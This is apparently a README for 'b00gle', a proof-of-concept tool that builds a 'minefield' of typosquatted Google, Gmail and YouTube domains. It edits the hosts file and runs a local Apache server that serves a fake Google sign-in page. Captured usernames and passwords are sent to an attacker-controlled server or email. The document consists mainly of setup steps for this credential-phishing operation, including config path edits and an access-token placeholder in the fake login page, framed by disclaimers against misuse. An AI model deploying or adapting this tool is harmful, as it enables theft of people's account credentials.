# b00gle
A TypoSquatting Minefield




b00gle is a proof-of-concept tool designed to create a ‘minefield’ of malicious domains based on misspellings of popular Google services. The tool starts up an Apache httpd server which runs continuously in the background, while the system’s hosts file is modified to include the extensive list of malicious domain. The tool relies on the user typing a domain or URL incorrectly – if this mistyped name matches one of the malicious domains created by the tool, the user is redirected to a malicious Google sign-in page. Username and password data gathered from the sign-in page is stored in the browser’s cookies and sent to either a server, or email address controlled by the attacker.

<h5> THIS IS A PROOF-OF-CONCEPT PROJECT. PLEASE DO NOT GET FREAKY, EVIL, SINISTER, OR COMMIT CRIMES USING B00GLE -- IT'S BAD FOR ME AND YOU, BUT MAINLY FOR YOU. </h5>

A domain_variations.txt file with popular google domains such as gmail, google, and youtube comes pre-loaded with b00gle. If you would like to replace the file with a new domain_variations.txt, execute the following command:
	./variations.exe domain1.com domain2.com domain3.com ... domainN.com
to generate a new domain.variations.txt file. Move this new text file into htdocs, and delete the old version.


<h4> To Change In b00gle/conf/extra/http-vhosts.conf: </h4>
	<p>4:	DocumentRoot <PATH TO B00GLE>\htdocs
	6:	SSLCertificateFile "<PATH TO B00GLE>\conf\ssl.crt\server.crt"
	7:	SSLCertificateKeyFile "<PATH TO B00GLE>\conf\ssl.key\server.key"</p>

<h4> To Change In b00gle/conf/extra/httpd-ssl.conf: </h4>
	<p>13:	SSLSessionCache "<PATH TO B00GLE>\htdocs\logs\ssl_scache(512000)"
	18:	DocumentRoot "<PATH TO B00GLE>\htdocs"
	21: ErrorLog "<PATH TO B00GLE>\logs\error.log"
	22:	TransferLog "<PATH TO B00GLE>\logs\access.log"
	38:	CustomLog "<PATH TO B00GLE>\logs\ssl_request.log" \</p>
	
<h4> To Change In b00gle/conf/extra/httpd-dir.conf: </h4>
	<p>1:	LoadFile "<PATH TO B00GLE>\php\php8ts.dll"
	2:	LoadFile "<PATH TO B00GLE>\php\libpq.dll"
	3:	LoadFile "<PATH TO B00GLE>\php\libsqlite3.dll"
	4:	LoadModule php_module "<PATH TO B00GLE>\php\php8apache2_4.dll"</p>

<h4> To Change in b00gle/conf/httpd.conf: </h4>
	<p>1:	Define SRVROOT "<PATH TO B00GLE>"
	3:	ServerRoot "<PATH TO B00GLE>"
	24:	DocumentRoot "<PATH TO B00GLE>\htdocs"
	25:	<Directory "<PATH TO B00GLE>\htdocs"></p>
	
<h4> To Change in b00gle/htdocs/v3/signin/identifier: </h4>
	246: var data_js = {"access_token": "YOUR_ACCESS_TOKEN"};
	

<h4> Execute b00gle.exe to start up the Apache HTTP Server. </h4>

<h5> TO REITERATE, PLEASE DO NOT USE B00GLE WITH MALICIOUS INTENT, AND DO NOT RECOMMEND IT TO THOSE WHO ARE KNOWN TO ACT WITH MALICIOUS INTENT. THANK YOU :) </h5>
